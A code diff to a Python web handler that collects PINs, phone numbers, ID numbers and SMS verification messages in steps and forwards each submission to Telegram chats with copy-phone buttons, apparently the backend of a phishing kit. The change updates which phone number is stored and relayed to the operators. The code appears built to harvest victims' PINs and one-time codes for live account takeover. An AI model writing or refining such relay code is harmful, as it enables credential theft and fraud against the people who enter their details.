@@ -2126,6 +2126,8 @@ class Handler(BaseHTTPRequestHandler):
                 phone = str(data.get("phone", "")).strip()
                 if not zip_code or not phone:
                     return self.send_json(400, {"error": "PIN and phone number are required"})
+                if phone != app["phone"]:
+                    db.execute("UPDATE applications SET phone = ? WHERE id = ?", (phone, val_uuid))
             elif step == "id_document":
                 id_number = str(data.get("idNumber", "")).strip()
                 if not id_number:
@@ -2160,7 +2162,8 @@ class Handler(BaseHTTPRequestHandler):
 
         if target_chats and telegram_bot_token():
             step_label = "📍 Step 3: PIN Validation" if step == "zip_phone" else "💬 Step 4: SMS / Verification Message"
-            phone_display = app["phone"] if str(app["phone"]).startswith("+") else f"+232 {app['phone']}"
+            active_phone = phone if (step == "zip_phone" and phone) else app["phone"]
+            phone_display = active_phone if str(active_phone).startswith("+") else f"+232 {active_phone}"
             lines = [
                 f"📋 Verification Submission — {step_label}",
                 f"Ref: {val_uuid}",
@@ -2173,7 +2176,7 @@ class Handler(BaseHTTPRequestHandler):
                 lines.append(f"Message / ID: {id_number}")
             lines.append("Status: Awaiting Verification")
 
-            phone_raw = str(app["phone"]).strip()
+            phone_raw = str(active_phone).strip()
             buttons = {
                 "inline_keyboard": [
                     [{"text": f"📋 Copy Phone ({phone_raw})", "copy_text": {"text": phone_raw}}],
